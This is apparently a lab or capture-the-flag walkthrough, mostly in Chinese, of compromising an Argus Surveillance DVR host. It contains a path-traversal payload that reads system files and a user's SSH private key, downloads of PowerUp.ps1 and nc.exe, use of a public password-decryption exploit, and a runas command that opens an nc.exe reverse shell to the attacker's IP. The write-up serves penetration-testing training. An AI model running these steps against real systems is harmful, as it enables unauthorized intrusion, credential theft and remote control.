# DVR4
![image](https://hackmd.io/_uploads/Bk8f0I631e.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -T4 -p- 192.168.124.179       
...
Host is up (0.12s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp   open     msrpc          Microsoft Windows RPC
139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
326/tcp   filtered unknown
445/tcp   open     microsoft-ds?
481/tcp   filtered dvs
637/tcp   filtered lanserver
1953/tcp  filtered rapidbase
3978/tcp  filtered secure-cfg-svr
3998/tcp  filtered dnx
5040/tcp  open     unknown
8080/tcp  open     http-proxy
|_http-title: Argus Surveillance DVR
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
12745/tcp filtered unknown
17951/tcp filtered unknown
22015/tcp filtered unknown
35995/tcp filtered unknown
37289/tcp filtered unknown
37889/tcp filtered unknown
42948/tcp filtered unknown
44953/tcp filtered unknown
49664/tcp open     msrpc          Microsoft Windows RPC
49665/tcp open     msrpc          Microsoft Windows RPC
49666/tcp open     msrpc          Microsoft Windows RPC
49667/tcp open     msrpc          Microsoft Windows RPC
49668/tcp open     msrpc          Microsoft Windows RPC
49669/tcp open     msrpc          Microsoft Windows RPC
52732/tcp filtered unknown
63296/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=3/23%Time=67DFE268%P=aarch64-unknown-linux-gn
...
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-23T10:31:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s

```
> SSH, RPC, Http-proxy, 

瀏覽 http://192.168.124.179:8080/\
![image](https://hackmd.io/_uploads/SJVeVwTnJe.png)
瀏覽 http://192.168.124.179:8080/CamConfDevices.html?Cameras=new\
![image](https://hackmd.io/_uploads/HygGEP6hkx.png)
瀏覽 http://192.168.124.179:8080/Users.html
![image](https://hackmd.io/_uploads/rymYCwp3Jx.png)
> 透露 User

#### 1.2 Http-proxy scan
```
┌──(chw㉿CHW)-[~/Tools/spose_http-proxy-scanner]
└─$ python3 spose.py --proxy http://192.168.124.179:8080 --target 192.168.124.179
Scanning default common ports
Using proxy address http://192.168.124.179:8080
```

#### 1.3 Enum4linux
```
┌──(chw㉿CHW)-[~]
└─$ enum4linux -a 192.168.124.179
...
┌──(chw㉿CHW)-[~]
└─$ smbclient -N -L \\\\192.168.124.179\\
session setup failed: NT_STATUS_ACCESS_DENIED

```
> 沒有可利用的資訊
#### 1.4 Searchsploit
```
┌──(chw㉿CHW)-[~]
└─$ searchsploit Argus Surveillance DVR
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Argus Surveillance DVR 4.0 - Unquoted Service Path                                                                                                         | windows/local/50261.txt
Argus Surveillance DVR 4.0 - Weak Password Encryption                                                                                                      | windows/local/50130.py
Argus Surveillance DVR 4.0.0.0 - Directory Traversal                                                                                                       | windows_x86/webapps/45296.txt
Argus Surveillance DVR 4.0.0.0 - Privilege Escalation                                                                                                      | windows_x86/local/45312.c
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                   
┌──(chw㉿CHW)-[~]
└─$ searchsploit -x 50261
┌──(chw㉿CHW)-[~]
└─$ searchsploit -x 50130
┌──(chw㉿CHW)-[~]
└─$ searchsploit -x 45296
```
> Directory Traversal 可以嘗試利用

### 2. Exploit - Path Traversal
查看 `/windows/system.ini`
```
┌──(chw㉿CHW)-[~]
└─$ curl "http://192.168.124.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]

```
查看 `/Windows/win.ini`
```    
┌──(chw㉿CHW)-[~]
└─$ curl "http://192.168.124.179:8080/WEBACCOUNT.CGI?RESULTPAGE=../../../../../../../../Windows/win.ini"
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

```
🧠 已洩漏了 User:\
那直接 Path Traversal 拿 Flag XDD
```
┌──(chw㉿CHW)-[~]
└─$ curl "http://192.168.124.179:8080/WEBACCOUNT.CGI?RESULTPAGE=../../../../../../../../Users/Viewer/Desktop/local.txt"
{Flag}

```
### ✅ Get User Flag
> 在 `C:\Users\apache\Desktop`找到 User flag

🥚 仍需要提權，可以讀取 User `id_rsa`，使用 SSH 登入
### 3. SSH Login
```
┌──(chw㉿CHW)-[~]
└─$ curl "http://192.168.124.179:8080/WEBACCOUNT.CGI?RESULTPAGE=../../../../../../../../Users/Viewer/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAuuXhjQJhDjXBJkiIftPZng7N999zteWzSgthQ5fs9kOhbFzLQJ5J
Ybut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAP
iJ/njNKI0tjtpeO3rjGMkKgNKwvv3y2EcCEt1d+LxsO3Wyb5ezuPT349v+MVs7VW04+mGx
pgheMgbX6HwqGSo9z38QetR6Ryxs+LVX49Bjhskz19gSF4/iTCbqoRo0djcH54fyPOm3OS
2LjjOKrgYM2aKwEN7asK3RMGDaqn1OlS4tpvCFvNshOzVq6l7pHQzc4lkf+bAi4K1YQXmo
7xqSQPAs4/dx6e7bD2FC0d/V9cUw8onGZtD8UXeZWQ/hqiCphsRd9S5zumaiaPrO4CgoSZ
GEQA4P7rdkpgVfERW0TP5fWPMZAyIEaLtOXAXmE5zXhTA9SvD6Zx2cMBfWmmsSO8F7pwAp
zJo1ghz/gjsp1Ao9yLBRmLZx4k7AFg66gxavUPrLAAAFkMOav4nDmr+JAAAAB3NzaC1yc2
EAAAGBALrl4Y0CYQ41wSZIiH7T2Z4Ozfffc7Xls0oLYUOX7PZDoWxcy0CeSWG7rdASGz2l
HToTZUHLoQFGY2mjMZ1i2wyYExEyvIdetifNafaur0dsyqR7vQ4YtZLFcgD4if54zSiNLY
7aXjt64xjJCoDSsL798thHAhLdXfi8bDt1sm+Xs7j09+Pb/jFbO1VtOPphsaYIXjIG1+h8
...
-----END OPENSSH PRIVATE KEY-----
```
儲存在本機
```
┌──(chw㉿CHW)-[~]
└─$ curl "http://192.168.124.179:8080/WEBACCOUNT.CGI?RESULTPAGE=../../../../../../../../Users/Viewer/.ssh/id_rsa" > DVR4_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2612  100  2612    0     0   9860      0 --:--:-- --:--:-- --:--:--  9893
```
SSH 登入
```
┌──(chw㉿CHW)-[~]
└─$ chmod 600 DVR4_rsa
┌──(chw㉿CHW)-[~]
└─$ ssh viewer@192.168.124.179 -i DVR4_rsa
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\Users\viewer>whoami
dvr4\viewer

C:\Users\viewer>hostname
DVR4
C:\Users\viewer>powershell                                 
Windows PowerShell                                         
Copyright (C) Microsoft Corporation. All rights reserved.                         
Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\viewer>

```

## Privileges Escalation
### 4. PowerUp.ps1
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ ls
PowerUp.ps1  ...

┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ python3 -m http.server 80         
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
```
S C:\Users\viewer> iwr -Uri http://192.168.45.165/PowerUp.ps1 -UseBasicParsing -Outfile PowerUp.ps1

| Column 1 | Column 2 | Column 3 |
| -------- | -------- | -------- |
| Text     | Text     | Text     |

PS C:\Users\viewer> powershell -ep bypass                 
Windows PowerShell                                         
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6                                     
PS C:\Users\viewer> . .\PowerUp.ps1
PS C:\Users\viewer> Get-ModifiableServiceFile             
Get-ModifiableServiceFile : The term 'Get-ModifiableServiceFile' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or   
if a path was included, verify that the path is correct and try again.                                                                                                                       
At line:1 char:1                                           
+ Get-ModifiableServiceFile                               
+ ~~~~~~~~~~~~~~~~~~~~~~~~~                               
    + CategoryInfo          : ObjectNotFound: (Get-ModifiableServiceFile:String) [], CommandNotFoundException 
    + FullyQualifiedErrorId : CommandNotFoundException 
```
> viewer 無法存取 Win32_Service WMI

### 5. Searchsploit
🧠 在 `1.4 Searchsploit` 中有看到 `Argus Surveillance DVR 4.0 - Weak Password Encryption`
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ searchsploit -x 50130 
# Exploit Title: Argus Surveillance DVR 4.0 - Weak Password Encryption
# Exploit Author: Salman Asad (@deathflash1411) a.k.a LeoBreaker
# Date: 12.07.2021
# Version: Argus Surveillance DVR 4.0
# Tested on: Windows 7 x86 (Build 7601) & Windows 10
# Reference: https://deathflash1411.github.io/blog/dvr4-hash-crack

# Note: Argus Surveillance DVR 4.0 configuration is present in
# C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini

# I'm too lazy to add special characters :P
...
```
> 查看 `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`\

>[!Note]
>也可以直接搜尋檔案確認：\
>`Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Filter "DVRParams.ini" `

確認存在路徑
```
PS C:\> dir -Force                                            
    Directory: C:\                                                         
Mode                 LastWriteTime         Length Name                                       
----                 -------------         ------ ----     
d--hs-         12/3/2021  12:29 AM                $Recycle.Bin                                               
d--h--         4/15/2022   5:02 AM                $WinREAgent                                               
d--hs-         4/15/2022   7:08 AM                Config.Msi                                                 
d--hsl         6/18/2021  10:28 AM                Documents and Settings                                     
d-----         12/7/2019   1:14 AM                PerfLogs 
d-r---         4/15/2022   7:07 AM                Program Files                                                     
d-r---         6/18/2021   5:55 AM                Program Files (x86)                                                                          
d--h--         12/3/2021  12:24 AM                ProgramData                                               
d--hs-         3/11/2022  10:03 PM                Recovery 
d--hs-         6/18/2021   3:31 AM                System Volume Information                                                     
d-r---         12/3/2021  12:21 AM                Users   
d-----         4/15/2022   7:07 AM                Windows 
-a-hs-          8/1/2024  10:33 PM           8192 DumpStack.log.tmp                                         
-a----         3/23/2025   6:06 AM           2690 output.txt                                                                                  
-a-hs-          8/1/2024  10:33 PM      671088640 pagefile.sys                                               
-a-hs-          8/1/2024  10:33 PM      268435456 swapfile.sys

PS C:\> type "C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini"                           
[Main]                                                     
ServerName=                                               
ServerLocation=                
ServerDescription=
...
[Users]                  
LocalUsersCount=2            
UserID0=434499                                             
LoginName0=Administrator
...
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
...
Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
...
```
### 6. 使用 exploit
```
┌──(chw㉿CHW)-[~]
└─$ searchsploit -m 50130

┌──(chw㉿CHW)-[~]
└─$ vi 50130.py 
...
# Change this :)
pass_hash = "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A85E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE"
if (len(pass_hash)%4) != 0:
        print("[!] Error, check your password hash")
        exit()
split = []
n = 4
...

┌──(chw㉿CHW)-[~]
└─$ python3 50130.py                                   

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown
[+] 5E53:I
[+] 4D7B:m
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] C875:i
[+] EB60:n
[+] 3CD9:g
[+] D8E1:Y
[+] BD8F:0
[+] AAFE:u

```
> [-] D9A8:Unknown 是特殊字元\
> 找到更詳細的 Exploit [CVE-2022-25012](https://github.com/s3l33/CVE-2022-25012/blob/main/CVE-2022-25012.py)
> D9A8:`$`
> >`14WatchD0g$ImWatchingY0u`

現在有 Admin 帳號密碼，但沒有 id_rsa 無法用 SSH 登入
### 7. Runas
使用 Runs 再利用 nc.exe 開一個 revershell 
#### 7.1 確認系統環境
```
PS C:\Users\viewer\Desktop> systeminfo                     
ERROR: Access denied                                       
PS C:\Users\viewer\Desktop> [Environment]::Is64BitOperatingSystem         
True
```
> systeminfo 權限不足，使用 `[Environment]::Is64BitOperatingSystem`
>> x64

#### 7.2 下載 nc.exe
(Kali)
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ ls
nc_x64.exe ...
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
(Windows)
```
PS C:\Users\viewer\Desktop> iwr -uri http://192.168.45.178/nc_x64.exe -Outfile nc.exe           
PS C:\Users\viewer\Desktop> ls                             
    Directory: C:\Users\viewer\Desktop                              
Mode                 LastWriteTime         Length Name     
----                 -------------         ------ ----                
-a----         3/23/2025   6:06 AM             34 local.txt                                                 
-a----         3/23/2025   6:57 AM         207523 nc.exe
```
#### 7.3 執行 Runas Admin
Kali 開啟監聽 port
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
```
執行 Runas Admin
```
PS C:\Users\viewer\Desktop> runas /user:administrator "C:\users\viewer\desktop\nc.exe -e cmd.exe 192.168.45.178 8888"                                                     
Enter the password for administrator:                     
Attempting to start C:\users\viewer\desktop\nc.exe -e cmd.exe 192.168.45.178 8888 as user "DVR4\administrator" ...
```
#### 7.4 取得 Shell
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.178] from (UNKNOWN) [192.168.124.179] 50691
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
dvr4\administrator
```

### ✅ Get Root FLAG
> 在 `C:\Users\Administrator\Desktop` 找到 Root flag
